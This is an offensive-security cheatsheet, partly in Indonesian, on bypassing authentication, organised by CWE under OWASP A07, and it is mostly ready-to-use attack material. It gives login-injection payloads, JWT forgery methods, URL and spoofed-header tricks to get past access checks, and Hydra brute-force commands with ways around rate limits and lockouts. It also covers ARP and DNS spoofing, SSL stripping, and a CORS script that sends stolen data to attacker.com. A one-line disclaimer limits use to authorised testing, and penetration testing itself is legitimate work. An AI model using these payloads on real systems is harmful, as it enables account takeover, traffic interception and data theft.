# 🔑 AUTHENTICATION FAILURES CHEATSHEET — Part 07A

## OWASP A07:2021 — Authentication Bypass, Brute Force, Session Attacks

> ⚠️ **Hanya untuk penetration testing yang sudah diotorisasi.**

---

## 📑 Table of Contents (07A)
1. [CWE-287: Improper Authentication](#cwe-287-improper-authentication)
2. [CWE-288/289/290: Auth Bypass Methods](#cwe-288289290-auth-bypass-methods)
3. [CWE-291/293: IP/Referer Auth Bypass](#cwe-291293-ipreferer-auth-bypass)
4. [CWE-294: Capture-Replay](#cwe-294-capture-replay)
5. [CWE-295/297/298/299: Certificate Validation](#cwe-295297298299-certificate-validation)
6. [CWE-300: Channel Non-Endpoint Access (MITM)](#cwe-300-mitm)
7. [CWE-302/303/304/305: Auth Logic Flaws](#cwe-302303304305-auth-logic-flaws)
8. [CWE-306: Missing Auth for Critical Function](#cwe-306-missing-auth-for-critical-function)
9. [CWE-307: No Brute Force Protection](#cwe-307-no-brute-force-protection)
10. [CWE-308/309: Weak Authentication Factors](#cwe-308309-weak-auth-factors)
11. [CWE-346/350: Origin Validation & DNS Reliance](#cwe-346350-origin-validation)

---

# CWE-287: Improper Authentication

**Deskripsi**: Authentication mechanism yang tidak memvalidasi identity user dengan benar.

## Detection & Exploitation

```bash
# ===== COMMON AUTH BYPASS TECHNIQUES =====

# 1. Default credentials
admin:admin
admin:password
admin:123456
root:root
test:test
administrator:administrator

# 2. SQL Injection in login
' OR 1=1--
admin'--
" OR ""="
' OR '1'='1'--
admin' OR '1'='1'#

# 3. Empty password
admin:
root:
user:

# 4. NoSQL injection (MongoDB)
{"username":"admin","password":{"$ne":""}}
{"username":"admin","password":{"$gt":""}}
{"username":"admin","password":{"$regex":".*"}}
{"username":{"$ne":""},"password":{"$ne":""}}

# 5. LDAP injection login
*)(uid=*))(|(uid=*
admin)(&)

# 6. JWT manipulation (see below)
# 7. Response manipulation (see below)

# ===== TOOLS =====
# Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid" -t 10

# Burp Intruder: Cluster bomb with user/pass lists

# Nuclei
nuclei -u https://target.com -tags default-login,auth-bypass
```

## JWT Authentication Bypass

```bash
# ===== JWT STRUCTURE =====
# Header.Payload.Signature (base64url encoded)

# ===== ATTACK 1: Algorithm None =====
# Change header: {"alg":"none"}
# Remove signature
echo -n '{"alg":"none","typ":"JWT"}' | base64url
echo -n '{"sub":"admin","role":"admin"}' | base64url
# Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.

# Variants:
# "alg":"None"
# "alg":"NONE"
# "alg":"nOnE"

# ===== ATTACK 2: Algorithm Confusion (RS256 → HS256) =====
# Server uses RS256 (asymmetric) but accepts HS256 (symmetric)
# Sign with the PUBLIC KEY as HMAC secret
# python:
# import jwt
# public_key = open('public.pem').read()
# token = jwt.encode({"sub":"admin"}, public_key, algorithm="HS256")

# ===== ATTACK 3: Weak Secret =====
# Crack JWT secret with hashcat
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
# atau
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# jwt_tool
python3 jwt_tool.py JWT_TOKEN -C -d /usr/share/wordlists/rockyou.txt

# ===== ATTACK 4: KID Injection =====
# Header: {"alg":"HS256","kid":"../../etc/passwd"}
# Sign with content of /etc/passwd as secret
# Header: {"alg":"HS256","kid":"key' UNION SELECT 'secret'--"}

# ===== ATTACK 5: JKU/X5U Injection =====
# Point JKU to attacker-controlled JWKS
# Header: {"alg":"RS256","jku":"https://attacker.com/.well-known/jwks.json"}

# ===== ATTACK 6: Modify Claims =====
# Decode → change role/user → re-encode (if secret known)
# {"sub":"user","role":"user"} → {"sub":"user","role":"admin"}

# ===== TOOLS =====
# jwt_tool (comprehensive)
pip install pyjwt
git clone https://github.com/ticarpi/jwt_tool.git
python3 jwt_tool.py TOKEN                          # Decode
python3 jwt_tool.py TOKEN -T                       # Tamper
python3 jwt_tool.py TOKEN -C -d wordlist.txt       # Crack
python3 jwt_tool.py TOKEN -X a                     # Algorithm none
python3 jwt_tool.py TOKEN -X k -pk public.pem      # Key confusion

# jwt.io (online decoder)
# https://jwt.io
```

## Response Manipulation Auth Bypass

```bash
# ===== INTERCEPT & MODIFY RESPONSE =====
# Burp: Proxy → Options → Match & Replace
# Or: Intercept response, modify before browser sees it

# 1. Change status code
HTTP/1.1 403 Forbidden → HTTP/1.1 200 OK

# 2. Modify JSON response
{"authenticated":false} → {"authenticated":true}
{"role":"user"} → {"role":"admin"}
{"success":0} → {"success":1}
{"error":"Access denied"} → (remove error field)

# 3. Modify redirect
302 → /login  →  Change to 200 + copy admin page content
```

---

# CWE-288/289/290: Auth Bypass Methods

## CWE-288: Alternate Path/Channel

```bash
# ===== BYPASS VIA ALTERNATE PATH =====
# Normal: /login → /dashboard (requires auth)
# Bypass: /dashboard directly (no auth check)

# Mobile API (different auth)
/api/v1/login        # Web (strong auth)
/api/mobile/login    # Mobile (weaker auth)

# Internal API
/internal/admin      # No auth from internal IP
/debug/users         # Debug endpoint no auth

# Different HTTP method
POST /admin → 403
GET /admin → 200

# GraphQL bypass
# REST: /api/users (requires auth)
# GraphQL: query { users { id name } } (no auth)
```

## CWE-289: Alternate Name Bypass

```bash
# URL variations to bypass auth
/admin → 403
/Admin → 200
/ADMIN → 200
/admin/ → 200
/admin/. → 200
/./admin → 200
//admin → 200
/admin%20 → 200
/admin%09 → 200
/%61dmin → 200
/admin;.css → 200
/admin..;/ → 200

# File extension bypass
/admin.php → 403
/admin.PHP → 200
/admin.PhP → 200
/admin.php/ → 200
/admin.php%00 → 200
/admin.php%00.jpg → 200
```

## CWE-290: Spoofing Bypass

```bash
# ===== IP SPOOFING HEADERS =====
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
X-Cluster-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
X-ProxyUser-Ip: 127.0.0.1

# ===== HOST HEADER SPOOFING =====
Host: localhost
Host: 127.0.0.1
X-Forwarded-Host: localhost

# ===== USER-AGENT SPOOFING =====
User-Agent: Googlebot/2.1
User-Agent: internal-scanner
User-Agent: admin-tool
```

---

# CWE-291/293: IP/Referer Auth

## CWE-291: IP-Based Auth

```bash
# If server relies on IP for auth → spoof headers
curl -H "X-Forwarded-For: 10.0.0.1" https://target.com/admin
curl -H "X-Real-IP: 192.168.1.1" https://target.com/internal

# Test all IP bypass headers simultaneously
curl https://target.com/admin \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 127.0.0.1" \
  -H "X-Originating-IP: 127.0.0.1" \
  -H "X-Remote-IP: 127.0.0.1" \
  -H "X-Remote-Addr: 127.0.0.1" \
  -H "X-Client-IP: 127.0.0.1" \
  -H "True-Client-IP: 127.0.0.1"
```

## CWE-293: Referer-Based Auth

```bash
# If server checks Referer for auth
curl -H "Referer: https://target.com/admin" https://target.com/admin/secret
curl -H "Referer: https://target.com/login?success=true" https://target.com/dashboard
curl -H "Referer: " https://target.com/admin  # Empty referer
curl https://target.com/admin  # No referer header
```

---

# CWE-294: Capture-Replay

```bash
# ===== SESSION TOKEN REPLAY =====
# 1. Capture valid session token
# 2. Use on different machine/browser
curl -H "Cookie: session=CAPTURED_TOKEN" https://target.com/dashboard

# ===== API KEY REPLAY =====
curl -H "Authorization: Bearer CAPTURED_TOKEN" https://target.com/api/admin

# ===== OTP REPLAY =====
# 1. Capture valid OTP
# 2. Use same OTP again → should fail but sometimes works

# ===== PREVENTION CHECKS =====
# Does token expire?
# Does token bind to IP?
# Is there anti-replay mechanism (nonce)?
# Does logout invalidate server-side?
```

---

# CWE-295/297/298/299: Certificate Validation

```bash
# ===== SSL/TLS TESTING =====
# testssl.sh (comprehensive)
git clone https://github.com/drwetter/testssl.sh.git
./testssl.sh https://target.com

# SSLScan
sslscan target.com

# Nmap SSL scripts
nmap --script ssl-enum-ciphers,ssl-cert -p 443 target.com
nmap --script ssl-heartbleed -p 443 target.com

# Check certificate
openssl s_client -connect target.com:443 -showcerts
openssl s_client -connect target.com:443 | openssl x509 -noout -text

# ===== MITM (if cert validation disabled) =====
# mitmproxy
mitmproxy -p 8080
# Jika app tidak validate cert → intercept semua traffic

# Bettercap
bettercap -iface eth0 -eval "set arp.spoof.targets TARGET_IP; arp.spoof on; set net.sniff.local true; net.sniff on"

# ===== COMMON ISSUES =====
# - Self-signed cert accepted
# - Expired cert accepted
# - Hostname mismatch accepted
# - Revoked cert accepted
# - Weak cipher suites (RC4, DES, NULL)
# - SSLv2/SSLv3 enabled
# - Missing HSTS
```

---

# CWE-300: MITM (Channel Non-Endpoint)

```bash
# ===== ARP SPOOFING =====
# arpspoof
arpspoof -i eth0 -t TARGET_IP GATEWAY_IP

# Bettercap
bettercap -iface eth0
> set arp.spoof.targets TARGET_IP
> arp.spoof on
> net.sniff on

# ===== DNS SPOOFING =====
bettercap -iface eth0
> set dns.spoof.domains target.com
> set dns.spoof.address ATTACKER_IP
> dns.spoof on

# ===== SSL STRIP =====
# Downgrade HTTPS → HTTP
bettercap -iface eth0
> set arp.spoof.targets TARGET_IP
> arp.spoof on
> set net.sniff.local true
> set http.proxy.sslstrip true
> http.proxy on
> net.sniff on

# ===== TOOLS =====
# Wireshark: packet capture & analysis
# Ettercap: MITM framework
# Responder: LLMNR/NBT-NS poisoning (Windows)
responder -I eth0 -rdw
```

---

# CWE-302/303/304/305: Auth Logic Flaws

```bash
# ===== CWE-302: Assumed-Immutable Data =====
# Modify cookie/hidden field that server trusts
Cookie: isAdmin=false → isAdmin=true
Cookie: role=user → role=admin
# Hidden field: <input type="hidden" name="user_level" value="1"> → value="9"

# ===== CWE-303: Incorrect Auth Algorithm =====
# Server uses weak comparison
# PHP: == instead of === (type juggling)
# "0e123456" == "0e654321" → TRUE (both interpreted as 0)
# Password: 0e462097431906509019562988736854 (MD5 of "240610708")
# Magic hashes: if MD5(pass) starts with "0e" → equals 0 in loose comparison

# PHP type juggling payloads:
# true (boolean) == "password" → TRUE in some cases
# 0 == "string" → TRUE
# [] == false → TRUE

# ===== CWE-304: Missing Critical Step =====
# Skip MFA/verification step
# Normal: login → MFA → dashboard
# Bypass: login → (skip MFA) → dashboard
# Direct access to post-MFA URL

# ===== CWE-305: Auth by Primary Weakness =====
# Authentication relies on weak factor
# - Security questions (easily guessable/OSINT)
# - SMS OTP (SIM swap)
# - Email OTP (email compromise)
```

---

# CWE-306: Missing Auth for Critical Function

```bash
# ===== FIND UNPROTECTED ENDPOINTS =====
# Admin functions without auth
GET /api/admin/users
POST /api/admin/delete-user
PUT /api/admin/config
GET /api/internal/debug
POST /api/reset-password  # No old password required
GET /api/export/all-data

# Password reset without auth
POST /api/change-password
{"new_password":"hacked123"}
# No old_password field required!

# ===== TESTING =====
# 1. Map all endpoints (katana, spider)
# 2. Remove Authorization header
# 3. Check if endpoint still responds with data
# 4. Try unauthenticated access

# Nuclei
nuclei -u https://target.com -tags unauth,misconfig
```

---

# CWE-307: No Brute Force Protection

```bash
# ===== TEST RATE LIMITING =====
# Send 100+ login attempts rapidly
# Check: is there lockout? CAPTCHA? delay?

# Hydra
hydra -l admin -P rockyou.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid" -t 50 -f

# ===== BYPASS RATE LIMITING =====
# 1. IP rotation
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid" \
  -x proxy_list.txt

# 2. Header rotation
X-Forwarded-For: RANDOM_IP (per request)
X-Real-IP: RANDOM_IP

# 3. Username enumeration first, then targeted brute
# 4. Null byte in password: password%00 (may bypass length check)
# 5. Add spaces: " password" vs "password"
# 6. Case variation: "Password" vs "password"

# ===== ACCOUNT LOCKOUT BYPASS =====
# 1. Try N-1 attempts (just under lockout threshold)
# 2. Wait for lockout timer reset
# 3. Repeat

# Credential stuffing
# Use leaked credential databases
# Tool: Sentry MBA, OpenBullet, Snipr
```

---

# CWE-308/309: Weak Auth Factors

```bash
# ===== CWE-308: Single-Factor Only =====
# No MFA → brute force / credential stuffing possible
# Test: Does login only require username+password?
# Recommendation: Enforce TOTP/WebAuthn

# ===== CWE-309: Password-Only Auth =====
# Test weak auth methods:
# - No MFA available
# - SMS-only MFA (SIM swap vulnerable)
# - Email-only MFA (email compromise)
# - Security questions only

# MFA BYPASS TECHNIQUES:
# 1. Direct URL access (skip MFA page)
# 2. Null/empty OTP: {"otp":""}
# 3. OTP: 000000 (default/bypass)
# 4. Response manipulation (change false→true)
# 5. OTP reuse (same code works twice)
# 6. OTP brute force (4-6 digit = 10000-1000000 attempts)
# 7. Backup codes brute force
# 8. Race condition (use OTP before it's invalidated)
```

---

# CWE-346/350: Origin Validation & DNS

```bash
# ===== CWE-346: Origin Validation Error =====
# CORS misconfiguration
curl -H "Origin: https://evil.com" -I https://target.com/api/data
# Check response:
# Access-Control-Allow-Origin: https://evil.com  → VULNERABLE
# Access-Control-Allow-Credentials: true         → CRITICAL

# Null origin
curl -H "Origin: null" -I https://target.com/api/data

# Subdomain wildcard
curl -H "Origin: https://evil.target.com" -I https://target.com/api/data

# CORS exploitation
<script>
  fetch('https://target.com/api/sensitive-data', {credentials:'include'})
    .then(r => r.json())
    .then(d => fetch('https://attacker.com/steal?data='+JSON.stringify(d)));
</script>

# Tools
# CORScanner
python cors_scan.py -u https://target.com
# Nuclei
nuclei -u https://target.com -tags cors

# ===== CWE-350: Reverse DNS Trust =====
# Server trusts reverse DNS for auth
# Attacker controls PTR record → spoof identity
nslookup ATTACKER_IP → returns "trusted.target.com"
```
